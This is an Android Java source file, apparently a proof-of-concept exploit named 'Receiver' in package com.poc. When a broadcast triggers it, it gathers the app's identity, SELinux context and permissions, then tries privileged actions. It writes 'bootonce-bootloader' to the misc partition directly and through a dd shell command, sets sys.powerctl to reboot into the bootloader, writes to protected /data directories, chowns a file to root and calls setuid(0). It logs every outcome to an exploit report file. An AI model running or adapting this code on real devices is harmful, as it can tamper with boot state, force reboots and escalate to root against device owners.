package com.poc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Process;
import android.system.Os;
import android.system.OsConstants;
import android.system.ErrnoException;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class Receiver extends BroadcastReceiver {

    private static final String REPORT_PATH = "/cache/exploit_report.txt";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"com.poc.ACTION_START".equals(intent.getAction())) {
            return;
        }
        runExploit();
    }

    private void runExploit() {
        StringBuilder report = new StringBuilder();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault());

        report.append("========================================\n");
        report.append("   BCB & /data Write Verification (Pure Java, Os syscalls)\n");
        report.append("   Time: ").append(sdf.format(new Date())).append("\n");
        report.append("========================================\n\n");

        try {
            // --- [1] Basic Identity ---
            int uid = Process.myUid();
            int pid = Process.myPid();
            report.append("UID: ").append(uid).append("\n");
            report.append("PID: ").append(pid).append("\n\n");

            // --- [2] Related Packages (reflection) ---
            Object pm = getPackageManagerService();
            if (pm != null) {
                try {
                    Method getPackagesForUid = pm.getClass().getMethod("getPackagesForUid", int.class);
                    String[] pkgs = (String[]) getPackagesForUid.invoke(pm, uid);
                    report.append("Related Packages: ").append(pkgs != null ? String.join(", ", pkgs) : "None").append("\n\n");
                } catch (Exception e) {
                    report.append("Related Packages: Error - ").append(e.getMessage()).append("\n\n");
                }
            } else {
                report.append("Related Packages: Service not available\n\n");
            }

            // --- [3] SELinux Context ---
            report.append("SELinux Context: ").append(readFile("/proc/self/attr/current")).append("\n\n");

            // --- [4] System Properties ---
            report.append("--- System Properties ---\n");
            report.append("ro.build.version.release: ").append(getProp("ro.build.version.release")).append("\n");
            report.append("ro.build.version.security_patch: ").append(getProp("ro.build.version.security_patch")).append("\n");
            report.append("ro.factorytest: ").append(getProp("ro.factorytest")).append("\n");
            report.append("ro.debuggable: ").append(getProp("ro.debuggable")).append("\n");
            report.append("ro.secure: ").append(getProp("ro.secure")).append("\n\n");

            // --- [5] Filesystem Access (Os syscalls) ---
            report.append("--- Filesystem Access (Os.open/Os.write) ---\n");
            report.append("Write /cache/test_write.tmp: ").append(writeTestOs("/cache/test_write.tmp")).append("\n");
            report.append("Write /data/local/tmp/test_write.tmp: ").append(writeTestOs("/data/local/tmp/test_write.tmp")).append("\n");
            report.append("Write /data/system/test_write.tmp: ").append(writeTestOs("/data/system/test_write.tmp")).append("\n");
            report.append("Write /data/data/test_write.tmp: ").append(writeTestOs("/data/data/test_write.tmp")).append("\n");
            report.append("Execute /system/bin/sh: ").append(canExecute("/system/bin/sh")).append("\n");
            report.append("Execute /data/local/tmp/dummy: ").append(canExecute("/data/local/tmp/dummy")).append("\n\n");

            // --- [6] Permission Checks (reflection) ---
            report.append("--- Runtime Permissions ---\n");
            if (pm != null) {
                String[] perms = {
                    "android.permission.INSTALL_PACKAGES",
                    "android.permission.DELETE_PACKAGES",
                    "android.permission.WRITE_SECURE_SETTINGS",
                    "android.permission.REBOOT",   // keep for info, but we won't use reboot
                };
                for (String p : perms) {
                    try {
                        Method checkPerm = pm.getClass().getMethod("checkPermission", String.class, String.class, int.class);
                        int res = (int) checkPerm.invoke(pm, p, "com.poc", uid);
                        report.append("checkPermission(").append(p).append("): ").append(res == 0 ? "GRANTED" : "DENIED (" + res + ")").append("\n");
                    } catch (Exception e) {
                        report.append("checkPermission(").append(p).append("): Error\n");
                    }
                }
            }
            report.append("\n");

            // --- [7] BCB Write Verification (Direct misc partition write) ---
            report.append("--- BCB Write Verification (Direct misc partition) ---\n");

            // 7a. Direct write to misc partition via Os.open/Os.write
            String[] miscPaths = {"/dev/block/by-name/misc", "/dev/block/misc"};
            boolean miscWritten = false;
            for (String path : miscPaths) {
                FileDescriptor fd = null;
                try {
                    fd = Os.open(path, OsConstants.O_RDWR | OsConstants.O_SYNC, 0644);
                    // BCB command "bootonce-bootloader" (null terminated? We'll write as is)
                    byte[] data = "bootonce-bootloader".getBytes();
                    Os.lseek(fd, 0, OsConstants.SEEK_SET);
                    Os.write(fd, data, 0, data.length);
                    Os.fsync(fd);
                    report.append("Os.write to ").append(path).append(": SUCCESS (wrote bootonce-bootloader)\n");
                    miscWritten = true;
                    break;
                } catch (ErrnoException e) {
                    report.append("Os.write to ").append(path).append(": ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
                } catch (Exception e) {
                    report.append("Os.write to ").append(path).append(": EXCEPTION - ").append(e.getMessage()).append("\n");
                } finally {
                    if (fd != null) {
                        try { Os.close(fd); } catch (ErrnoException ignored) {}
                    }
                }
            }
            if (!miscWritten) {
                report.append("Direct write to misc partitions: FAILED (no writable device)\n");
            }

            // 7b. Try writing via dd command (if /system/bin/dd exists)
            report.append("Write misc via dd command: ");
            try {
                java.lang.Process p = Runtime.getRuntime().exec(
                    new String[]{"/system/bin/sh", "-c",
                        "echo -n 'bootonce-bootloader' | /system/bin/dd of=/dev/block/by-name/misc bs=1024 count=1 conv=notrunc 2>/dev/null"
                    }
                );
                int code = p.waitFor();
                report.append(code == 0 ? "SUCCESS (dd wrote to misc)\n" : "FAILED (exit=" + code + ")\n");
            } catch (Exception e) {
                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
            }

            // 7c. Set sys.powerctl to bootloader mode (sys.powerctl=reboot,bootloader)
            report.append("Set sys.powerctl=reboot,bootloader: ");
            try {
                Class<?> sp = Class.forName("android.os.SystemProperties");
                Method set = sp.getMethod("set", String.class, String.class);
                set.invoke(null, "sys.powerctl", "reboot,bootloader");
                report.append("SUCCESS (attempted, may trigger bootloader on next reboot)\n");
            } catch (Exception e) {
                report.append("FAILED: ").append(e.getMessage()).append("\n");
            }

            // 7d. Try to use setprop via command line
            report.append("setprop sys.powerctl reboot,bootloader: ");
            try {
                java.lang.Process p = Runtime.getRuntime().exec(
                    new String[]{"/system/bin/setprop", "sys.powerctl", "reboot,bootloader"}
                );
                int code = p.waitFor();
                report.append(code == 0 ? "SUCCESS\n" : "FAILED (exit=" + code + ")\n");
            } catch (Exception e) {
                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
            }

            // 7e. Try to write to /proc/cmdline? No, read-only.

            // 7f. Try to change bootloader message via /sys/class/... maybe not.

            // --- [8] /data Write Verification (Various paths) ---
            report.append("\n--- /data Write Verification (Multiple paths) ---\n");

            String[] dataPaths = {
                "/data/local/tmp/poc_test.txt",
                "/data/data/poc_test.txt",
                "/data/system/poc_test.txt",
                "/data/misc/poc_test.txt",
                "/data/user_de/0/poc_test.txt"
            };
            for (String path : dataPaths) {
                report.append("Write ").append(path).append(": ");
                FileDescriptor fd = null;
                try {
                    File f = new File(path);
                    // Ensure parent dir exists (some may not)
                    File parent = f.getParentFile();
                    if (parent != null && !parent.exists()) {
                        // Try to create directory (might fail)
                        parent.mkdirs();
                    }
                    fd = Os.open(path, OsConstants.O_WRONLY | OsConstants.O_CREAT | OsConstants.O_TRUNC, 0644);
                    Os.write(fd, "test".getBytes(), 0, 4);
                    Os.fsync(fd);
                    Os.close(fd);
                    fd = null;
                    // Try to delete
                    f.delete();
                    report.append("SUCCESS (write/delete)\n");
                } catch (ErrnoException e) {
                    report.append("ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
                } catch (Exception e) {
                    report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
                } finally {
                    if (fd != null) {
                        try { Os.close(fd); } catch (ErrnoException ignored) {}
                    }
                }
            }

            // --- [9] Additional system call tests (chown, chmod) ---
            report.append("\n--- Additional System Call Tests ---\n");
            // Try chown on a file we created (if any)
            String testFile = "/cache/test_chown.tmp";
            try {
                FileDescriptor fd = Os.open(testFile, OsConstants.O_WRONLY | OsConstants.O_CREAT, 0644);
                Os.close(fd);
                // Try to chown to root:root
                Os.chown(testFile, 0, 0);
                report.append("chown ").append(testFile).append(" 0:0: SUCCESS\n");
            } catch (ErrnoException e) {
                report.append("chown ").append(testFile).append(" 0:0: ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
            } catch (Exception e) {
                report.append("chown ").append(testFile).append(" 0:0: EXCEPTION - ").append(e.getMessage()).append("\n");
            } finally {
                new File(testFile).delete();
            }

            // Try setgid/setuid? Not possible without JNI? setuid is in Os? Actually Os.setuid exists.
            report.append("Os.setuid(0): ");
            try {
                Os.setuid(0);
                report.append("SUCCESS (now root!)\n");
            } catch (ErrnoException e) {
                report.append("ErrnoException (errno=").append(e.errno).append(") - ").append(e.getMessage()).append("\n");
            } catch (Exception e) {
                report.append("EXCEPTION: ").append(e.getMessage()).append("\n");
            }

            report.append("\n========================================\n");
            report.append("   End of Report\n");
            report.append("========================================\n");

        } catch (Throwable t) {
            report.append("\n!!! CRITICAL EXCEPTION: ").append(t.toString()).append("\n");
            t.printStackTrace();
        }

        // Save report
        try {
            saveReport(report.toString());
            System.out.println("[+] Report saved to " + REPORT_PATH);
        } catch (IOException e) {
            System.err.println("[-] Failed to save report: " + e.getMessage());
            try {
                new FileWriter("/data/local/tmp/exploit_report.txt").write(report.toString());
                System.out.println("[+] Saved to /data/local/tmp/exploit_report.txt");
            } catch (IOException ex) {
                System.err.println("[-] Could not save report anywhere.");
            }
        }
    }

    // --- Utilities ---

    private void saveReport(String content) throws IOException {
        File reportFile = new File(REPORT_PATH);
        if (!reportFile.getParentFile().exists()) reportFile.getParentFile().mkdirs();
        try (BufferedWriter w = new BufferedWriter(new FileWriter(reportFile))) {
            w.write(content);
        }
        try {
            Runtime.getRuntime().exec(new String[]{"/system/bin/chmod", "0644", REPORT_PATH});
        } catch (Exception ignored) {}
    }

    private String readFile(String path) {
        try {
            return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(path))).trim();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private String getProp(String key) {
        try {
            return (String) Class.forName("android.os.SystemProperties")
                    .getMethod("get", String.class, String.class)
                    .invoke(null, key, "(null)");
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private String writeTestOs(String path) {
        FileDescriptor fd = null;
        try {
            fd = Os.open(path, OsConstants.O_WRONLY | OsConstants.O_CREAT | OsConstants.O_TRUNC, 0644);
            Os.write(fd, "test".getBytes(), 0, 4);
            Os.fsync(fd);
            Os.close(fd);
            fd = null;
            new File(path).delete();
            return "SUCCESS (write/delete)";
        } catch (ErrnoException e) {
            return "ErrnoException (errno=" + e.errno + ") - " + e.getMessage();
        } catch (Exception e) {
            return "EXCEPTION: " + e.getMessage();
        } finally {
            if (fd != null) {
                try { Os.close(fd); } catch (ErrnoException ignored) {}
            }
        }
    }

    private String canExecute(String path) {
        File f = new File(path);
        if (f.exists()) {
            return f.canExecute() ? "EXECUTABLE" : "NOT EXECUTABLE";
        } else {
            File p = f.getParentFile();
            if (p != null && p.exists()) {
                return "FILE NOT FOUND, parent exec: " + (p.canExecute() ? "YES" : "NO");
            }
            return "PATH NOT FOUND";
        }
    }

    private Object getService(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getMethod("getService", String.class);
            android.os.IBinder binder = (android.os.IBinder) getService.invoke(null, name);
            if (binder == null) return null;
            if ("package".equals(name)) {
                Class<?> stubClass = Class.forName("android.content.pm.IPackageManager$Stub");
                Method asInterface = stubClass.getMethod("asInterface", android.os.IBinder.class);
                return asInterface.invoke(null, binder);
            }
            return binder;
        } catch (Exception e) {
            return null;
        }
    }

    private Object getPackageManagerService() {
        return getService("package");
    }
}
